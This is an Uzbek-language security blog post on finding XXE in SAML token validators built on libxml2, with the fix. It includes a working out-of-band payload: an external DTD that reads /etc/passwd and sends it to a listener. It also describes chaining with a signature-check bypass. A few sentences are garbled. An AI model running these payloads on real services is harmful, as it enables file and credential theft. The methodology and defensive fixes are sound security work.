---
title: "SAML validatorlarida XXE: imzo tekshirilmasidan oldin fayl o'qib olish"
date: 2026-08-14T10:30:00+05:00
tags: ["xxe", "saml", "methodology"]
slug: "saml-parser-xxe"
translationKey: saml-parser-xxe
draft: false
summary: "SAML token validatorlari nega XXE uchun qulay nishon, libxml2'ning asl sozlamalari ularni qanday sotib qo'yadi, va men buni qanday qidiraman — eng boshidan."
---

SAML aslida XML'dan boshqa narsa emas. XML parserlar esa o'sha XML ni olib kerakli formatga o'tkazib uning ustida qanaqadur amal bajaradi . Aynan shu ikki narsani research qilish ancha qiziqarli natijalar beradi.
SAML tokenni tekshiradigan kod XXE topish uchun eng ishonchli joylardan biri, va bu post nega
shundayligi haqida. Hammasini eng boshidan boshlayman, hech qachon XXE payload sinab  ko'rmagan bo'lsang ham tushunarli bo'lsin deb.

Bu — aniq bir bug haqida emas, butun bir klass haqida. Mahsulot ham yo'q, vendor ham. SAML
gapiradigan biror narsani research qilayotgan bo'lsang — SSO login, token tekshiruvchi xizmat, soket
orqali autentifikatsiya qiladigan agent — xullas shunga o'xshashlarini qidirishing foydali.

## Avvalo, XXE o'zi nima

XML'da **entity** degan qisqartmalar bor. Tayyorlaridan bir nechtasini ko'rgansan: `&lt;` —
bu `<`, `&amp;` — bu `&`. O'zing ham yangisini e'lon qilishing mumkin:

```xml
<!DOCTYPE foo [
  <!ENTITY greeting "hello">
]>
<foo>&greeting;</foo>
```

Parser buni o'qiganda `&greeting;` o'rniga `hello` qo'yadi. Bu yerda zaif yoki zararlovchi hech narsa yo'q —
oddiy topib-almashtirish (swap), hujjat ichida qoladi.

Xavf boshqa joyda. Entity'ning qiymati sen yozib qo'ygan matn bo'lishi shart emas — u
**tashqaridagi** narsaga, faylga yoki URL'ga ishora qilishi mumkin:

```xml
<!DOCTYPE foo [
  <!ENTITY secret SYSTEM "file:///etc/passwd">
]>
<foo>&secret;</foo>
```

Endi `&secret;` degani — *"borib `/etc/passwd` ni och, ichidagini shu yerga ko'chir"*. Agar
parser tashqi entity'larni ochadigan qilib sozlangan bo'lsa, aynan shuni qiladi: faylni o'qiydi
va mazmunini hujjatga joylaydi. Mana shu — **XXE**, ya'ni XML eXternal Entity injection.
Hujumchining XML'i parserni hech qachon tegmasligi kerak bo'lgan narsalarga yo'llaydi — lokal
fayllarga yoki ichki tarmoqdagi URL'larga (XXE aynan shu tariqa SSRF'ga aylanadi).

Qaysi entity'lar ochilishini **DTD** (Document Type Definition) belgilaydi — `<!DOCTYPE ... [
... ]>` ichidagi blok. DTD hujjatning o'zida turishi mumkin, yoki hujjat *"DTD'imni anavi
yerdan olib kel"* deb URL ko'rsatishi mumkin. Biz mana shu ikki richagni ishlatamiz.

Bir qatorda aytganda: **parser entity'larni ochsa va fayl-u URL'larga chiqishga tayyor bo'lsa,
XML'ni yozgan har kim uni istagan narsasini o'qishga majburlay oladi.** SAML token esa —
hujumchi yuborgan XML.

## Nega aynan validator

Odamlar aynan shu joyda adashadi. "SAML token imzolangan-ku," deyishadi, "hujumchi soxtasini
yasay olmaydi." To'g'ri — lekin bu yerda ahamiyati yo'q, sababini aytaman.

Imzoni tekshirish uchun avval hujjat xotirada bo'lishi kerak. Shu bois validator har doim
quyidagini, aynan shu tartibda bajaradi:

1. XML'ni xotiradagi daraxtga **parse** qiladi
2. Sxemani tekshiradi
3. Subject'ni, shartlarni, vaqt belgilarini tekshiradi
4. **Imzoni tekshiradi**

Imzo — to'rtinchi qadamda. Entity ochilishi, ya'ni fayl o'qish esa — birinchisida, parse
paytida. Kod to'rtinchi qadamga yetib *"bu imzo yaroqsiz, rad et"* degunicha, fayl allaqachon
o'qib bo'lingan va, hozir ko'rasan, allaqachon senga jo'natilgan ham.

Ya'ni biz yaroqli token yasashga urinmayapmiz. Biz **ataylab yaroqsiz** tokenni yuboryapmiz —
uning yagona vazifasi zararli entity'larni ichiga olib kirish. Token har safar to'rtinchi
qadamda rad etiladi, bizga esa rad etilishi muhim emas : payload birinchi qadamdayoq bizga kerakli natijani berib bo'lgan.

```goat
  hujumchi token   .-------------.  entity ochiladi   .------------.
  (yaroqsiz imzo)->|  XML parse  |----- fayl o'qish ->|  /etc/...  |
                   '------+------'   HTTP exfil        '------------'
                          |
                          v          o'qish yuqorida bo'lib bo'ldi;
                   .-------------.   bu rad etish endi kech
                   |  validatsiya|
                   '-------------'
```

## libxml2 tuzog'i

SAML bilan ishlaydigan C va C++ kodning aksariyati **libxml2** ustiga qurilgan, libxml2 esa
qanaqa flag bersang, o'shanga qarab ish tutadi. Bug ko'pincha shu yerda yashiringan. Ko'zga
ehtiyotkor ko'rinadigan parse chaqiruvi:

```c
doc = xmlReadMemory(token, len, NULL, NULL,
                    XML_PARSE_NOENT   |   // entity'larni ochadi
                    XML_PARSE_DTDATTR |   // DTD atributlarini qayta ishlaydi
                    XML_PARSE_DTDLOAD);   // tashqi DTD'larni yuklaydi
```

Shu uch flagni oddiy tilga o'girsak:

- `XML_PARSE_NOENT` — *"entity'larni och"* (ha, nomi teskari; "no entity" emas, aynan almashtir
  degani)
- `XML_PARSE_DTDLOAD` — *"hujjat tashqi DTD ko'rsatsa, borib olib kel"*
- Yetishmayotgani: `XML_PARSE_NONET` — *"tarmoqqa umuman chiqma."*

Mana shu oxirgisi — xavfsizlik kamari, va u bog'lanmagan. `DTDLOAD` yoniq, `NONET` o'chiq
bo'lsa, parser parse paytida bemalol tarmoqqa so'rov yuboradi. Entity ochilishini ham ustiga
qo'shsang — to'la o'qlangan XXE tayyor.

Xuddi shu ishni quyiroq darajada hal qiladigan yana ikki global kalit bor. Ularga tegmagan kod
eski libxml2 versiyalaridan xavfli standart holatni meros qilib oladi:

```c
xmlSubstituteEntitiesDefault(1);   // 1 = entity'larni ochadi
xmlLoadExtDtdDefaultValue = 1;     // 1 = tashqi DTD'larni yuklaydi
```

Menda tez-tez uchraydigan bir manzara: kodning xavfsiz varianti aslida **bor**, lekin u build
hech qachon yoqmaydigan `#ifdef` ichiga o'ralib qolgan. Kimdir tuzatishni yozgan, "keyinroq
yoqarmiz" deb kompilyatsiya flagi ortiga surib qo'ygan, natijada productionga chiqadigani —
zaif `#else` shoxi. Manbani o'qiganing tuzatish borligini ko'rsatadi, lekin uning yoqilgan yoki
yoqilmaganini aytmaydi. Qaysi macros sharti kompilyatsiya bo'lganini alohida tekshirishing shart.

## Buni fayl o'qishga aylantirish — qadam-baqadam

Payloadni shoshilmasdan yig'aylik. Yuboradigan tokenimiz **o'zimiz** boshqaradigan serverga
ishora qiladigan DTD olib boradi:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://127.0.0.1:9090/x.dtd">
  %dtd;
]>
<saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" Version="2.0">
  <saml:Issuer>anything</saml:Issuer>
</saml:Assertion>
```

Ikki narsaga e'tibor ber:

- `%dtd;` da `&` emas, `%` turibdi. Bu — **parameter entity**, ya'ni hujjat tanasida emas,
  DTD'ning o'z ichida ishlaydigan entity. Bizga kerak, chunki pastdagi hiyla faqat parameter
  entity bilan ishlaydi.
- Pastdagi `saml:Assertion` — tokenga o'xshab tursin degan shakl, xolos. Yaroqli imzo kerak
  emas. Haqiqiy assertion bo'lishi ham shart emas. Uning vazifasi bitta: parserga yetib borish.

Validator buni parse qilganda `%dtd;` ga duch keladi va serverimizdan
`http://127.0.0.1:9090/x.dtd` ni oladi. Biz javob qilib mana buni qaytaramiz:

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % wrap "<!ENTITY exfil SYSTEM 'http://127.0.0.1:9090/?d=%file;'>">
%wrap;
%exfil;
```

Parser bu bilan nima qilishini qadam-baqadam ko'raylik:

1. `%file` — `/etc/passwd` ni ochadi, ichidagini ushlab turadi.
2. `%wrap` — **yangi** entity, ya'ni `exfil` ni yasaydi; uning qiymati — query string'ga fayl
   mazmuni yopishtirilgan URL.
3. `%exfil;` — o'sha entity'ni ochadi va parser
   `http://127.0.0.1:9090/?d=<passwd mazmuni>` ga so'rov yuboradi.

Serverimiz — u ham tinglovchi vazifasini o'taydi — query string'i **aynan o'sha fayl** bo'lgan
so'rovni qabul qiladi. Fayl o'qildi va tashqariga chiqarildi.

Nega to'g'ridan-to'g'ri `file:///etc/passwd` emas ? Chunki validator
parse qilgan hujjatni deyarli hech qachon senga ko'rsatmaydi — tokenni rad etadi va xatolik
qaytaradi. Demak fayl mazmuni senga *javob orqali* qaytmaydi. Shu bois biz parserni faylni o'z
chiquvchi HTTP so'rovi orqali, webhook yoki boshqa listener orqali  olib chiqishga majburlaymiz. Mana bu —
**out-of-band (OOB)** usul, va yuqoridagi ichma-ich parameter-entity DTD — uni amalga
oshirishning klassik yo'li.

Payload otilishiga ta'sir qiladigan ikki nozik joy:

- **Agar** ilova parse qilgan qiymatni senga qaytarsa, bularning hammasiga hojat yo'q —
  tokendagi oddiy `file:///` entity kifoya, faylni to'g'ridan javobdan o'qiysan. OOB — hech
  narsa qaytmaydigan, eng ko'p uchraydigan holat uchun zaxira yo'l.
- **Ba'zi fayl mazmunlari payloadni buzadi.** Fayl ichidagi `%`, `&` yoki xom yangi qator
  entity o'ramini sindirib qo'yishi mumkin. `/etc/passwd`, `/etc/hostname` kabilari bilan
  muammo yo'q. Ichi noqulayroq fayllar uchun, stack ruxsat bersa, o'qishni base64 filtriga
  o'raysan — shunda baytlar yo'lda buzilmay yetib boradi.

## Imzo yo'lni to'sib tursa

Ba'zan validator imzosiz tokenni umuman parse ham qilmaydi — parse'dan oldin *nimanidir*
tekshiradi-yu, to'xtab qoladi. Bu OOB o'qishni boshlanmasdan jarayon tugaydi. Aynan shu yerda
**ikkinchi, alohida zaiflik** bizga yangi vector vazifasini o'taydi : imzo tekshiruvini chetlab o'tishga imkon
beradigan auth yo'li.

Men buni *"ishonchli chaqiruvchi"* flagi ko'rinishida uchratganman — so'rovdagi maydon, mazmunan
*"bu token yuqorida allaqachon tekshirilgan, qaytadan tekshirib o'tirma"* deydi. Xizmat esa buni
aslida umuman ishonchli bo'lmagan chaqiruvchilardan ham qabul qilaveradi. O'zicha bu allaqachon
autentifikatsiya bypass. XXE bilan zanjirlansa — oxirgi to'siqni ham olib tashlaydi: endi
parser sening kiritmalaring ustidan, oldida hech narsa turmagan holda ishlaydi.

Xulosa aniq bir flagda emas. Xulosa shuki: validatordagi XXE'ni imzo tekshiruvi bor bo'lsa 
**ham** urinib ko'rishga arziydi — chunki imzo tekshiruvlari doim ham qayta tekshiruvni ham tekshirmaydi `// TODO: buni haqiqatdan tekshir`

## Men buni qanday qidiraman

**Manba ochiq bo'lsa.** Parse chaqiruvlari va kalitlarni grepla:

```bash
# XML qayerda parse qilinadi
grep -rn "xmlReadMemory\|xmlParseMemory\|xmlReadDoc\|xmlCtxtReadMemory" .
# kutubxona darajasidagi kalitlar
grep -rn "xmlSubstituteEntitiesDefault\|xmlLoadExtDtdDefaultValue" .
# build flagi ortiga yashiringan xavfsiz yo'l
grep -rn "XML_PARSE_NONET" .        # keyin haqiqatdan kompilyatsiya bo'lganini tasdiqla
```

Agar parse DTD yuklasa-yu, `XML_PARSE_NONET` bo'lmasa — yoki faqat build hech qachon
yoqmaydigan `#ifdef` ichida bo'lsa — senda vector bor. Xursand bo'lishdan oldin qaysi qaysi macros shartidan
chiqqanini tasdiqlab ol.

**Qorong'u quti (black box).** DTD'si sen boshqaradigan hostga ishora qiladigan token yubor va
o'sha hostni callback uchun kuzat. OOB tinglovchi (HTTP serving yoki Collaborator
uslubidagi xizmat)  - bu yerda yagona ishonchli o'lchov, chunki validator deyarli har doim tokenni
rad etadi va javobda senga hech narsa demaydi. **Rad etilishi — kutilgan ish. Callback esa —
topilma.** So'rov umuman kelmasa, entity ochilishi katta ehtimol o'chiq — davom etaverasan.

Faqat callbackning o'zi entity ochilganini va o'qish sodir bo'lganini isbotlaydi. Zaiflikni ko'rsatish
uchun `/etc/shadow` . `/etc/passwd` ni o'qishga urinib ko'rish kk. Mexanizmni isbotlaganimizdan keyin to'xtab batafsil report yozib chiqishimiz kk. 
Tinchlovchingdagi natija screenshooti sening isboting.

## Tuzatish

Parser uchun: `XML_PARSE_NONET` ni qo'sh, va xavfsiz yo'lni build flagi ortiga yashirma — uni
shartsiz kompilyatsiya qil.

```c
doc = xmlReadMemory(token, len, NULL, NULL,
                    XML_PARSE_NOENT | XML_PARSE_DTDATTR | XML_PARSE_DTDLOAD
                    | XML_PARSE_NONET);
```

Undan ham to'g'risi: SAML validatoriga tashqi DTD yuklashning umuman keragi yo'q. Entity
ochilishini butunlay o'chir (`xmlSubstituteEntitiesDefault(0)`, `xmlLoadExtDtdDefaultValue = 0`)
va tarmoq o'chiq holda parse qil. Qatlamli himoya, ustiga hech narsa yo'qotmaysan — haqiqiy SAML
tokenlariga tashqi DTD kerak emas. "Imzoni chetlab o't" degan yo'l bo'lsa ham, u chaqiruvchining
haqiqatan imtiyozli ekaniga bog'lansin, chaqiruvchining o'zi o'rnatadigan flagga emas.

## Xulosa

SAML ko'rding — o'zingga bitta savol ber: **buni nima parse qiladi, va qaysi flaglar bilan?**
Imzo — chalg'ituvchi narsa; qiziqarli kod undan oldin ishlaydi. Parse chaqiruvini top,
`XML_PARSE_NONET` bor-yo'qligini qara, va bo'lmasa — bitta out-of-band callback'gina seni aniq
javobdan ajratib turgan bo'ladi.

